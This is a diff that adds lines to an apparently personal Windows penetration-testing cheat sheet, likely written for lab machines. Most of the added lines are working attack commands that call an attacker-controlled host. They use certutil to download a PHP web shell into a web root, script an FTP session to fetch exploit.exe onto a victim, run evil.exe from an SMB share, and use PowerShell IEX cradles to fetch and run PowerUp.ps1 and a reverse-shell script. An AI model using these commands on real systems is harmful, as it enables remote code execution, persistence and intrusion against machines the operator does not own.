@@ -5,6 +5,8 @@
 ** SHELL **
 ***********
 
+    $ icacls . // gives read/write permission
+
     $ hostname // gives hostname
 
     $ systeminfo // gives system info
@@ -40,7 +42,27 @@
 ** UPLOAD **
 ************
 
+    certutil -urlcache -split -f "http://10.10.14.5:8000/shell.php" c:\ColdFusion8\wwwroot\shell.php
 
+    python3 -m pyftpdlib -p 21
+      // on host
+
+    echo open 10.10.14.5 > ftp.txt & echo USER anonymous >> ftp.txt && echo PASS anonymous >> ftp.txt & echo binary >> ftp.txt & echo GET exploit.exe >> ftp.txt & echo BYE >> ftp.txt & ftp -n -v -s:ftp.txt
+      // on victim
+
+    Kali: smbserver.py a .
+    Windows: \\your.kali.ip.here\a\evil.exe
+      // extremely usefull as you can execute binaries from your kali on the windows directly
 
                 -------------------------------
 
+*************
+** PRIVESC **
+*************
+
+    cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 ./
+
+    echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.45:8000/PowerUp.ps1') | powershell -noprofile -
+
+    powershell iex(new-object net.webclient).downloadstring('http://10.10.14.45:8000/Invoke-PowerShellTcp.ps1')
+        // WORKS GREAT
